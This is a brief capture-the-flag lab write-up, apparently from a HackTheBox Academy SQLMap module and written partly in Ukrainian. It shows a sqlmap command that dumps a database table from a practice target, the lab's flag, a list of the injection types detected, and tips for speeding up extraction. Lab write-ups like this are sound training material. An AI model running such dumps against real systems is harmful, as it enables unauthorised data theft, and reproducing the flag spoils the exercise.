# SQLMap — Basic GET Injection (Case #1)

## Модуль
[SQLMap Essentials — Running SQLMap on HTTP Requests](https://academy.hackthebox.com/app/module/58/section/510)

## Команда

```bash
sqlmap -u "http://TARGET/case1.php?id=1" \
  --batch \
  --dump -T flag1 -D testdb \
  --threads=5
```

**Flag:** `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

## Знайдені injection типи (всі 4+1)

| Тип | Title |
|-----|-------|
| Boolean-based blind | AND boolean-based blind - WHERE clause |
| Error-based | MySQL >= 5.0 FLOOR error-based |
| Stacked queries | MySQL >= 5.0.12 stacked queries |
| Time-based blind | MySQL >= 5.0.12 AND SLEEP |
| **UNION query** | Generic UNION - 6 columns ← найшвидший |

## Ключові параметри ефективності

```bash
-D testdb      # вказати конкретну БД → пропускає enumeration
-T flag1       # вказати конкретну таблицю → пропускає --tables
--batch        # не питати підтверджень
--threads=5    # паралельні запити
```

> Без `-D` і `-T` sqlmap спочатку enumерує всі БД і таблиці — значно повільніше.
